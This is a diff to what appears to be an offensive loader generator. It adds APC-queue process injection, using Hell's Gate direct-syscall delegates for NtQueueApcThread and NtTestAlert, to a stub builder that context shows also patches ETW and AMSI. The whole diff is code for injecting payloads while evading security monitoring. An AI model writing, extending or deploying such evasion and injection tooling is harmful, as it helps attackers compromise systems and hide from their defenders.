@@ -1539,6 +1539,13 @@ proc lstrlenW*(lpString: PWCHAR): int =
 when defined(macPayload):
     proc RtlEthernetStringToAddressA*(str: PCSTR, terminator: ptr PCSTR, targetaddr: DWORD_PTR): NTSTATUS {.importc, dynlib: "ntdll.dll".}
 
+when defined(QueueAPC):
+    type
+      KNORMAL_ROUTINE* {.pure.} = object
+        NormalContext*: PVOID
+        SystemArgument1*: PVOID
+        SystemArgument2*: PVOID
+      PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE
 
 """
 
@@ -2233,6 +2240,10 @@ if(hellsgate):
     if(not localinject or remoteETWpatch or remoteAMSIpatch):
         stub.add(HellsgateNtOpenProcessDelegate)
         stub.add(HellsgateNtCreateThreadExDelegate)
+    if(localinject and useQueueAPC):
+        stub.add(HellsgateNtTestAlertDelegate)
+    if(useQueueAPC):
+        stub.add(HellsgateNtQueueApcThreadDelegate)
 
 if (AMSICreateSectionHook):
     stub.add(AmsiNtCreateSectionDecryptStub)
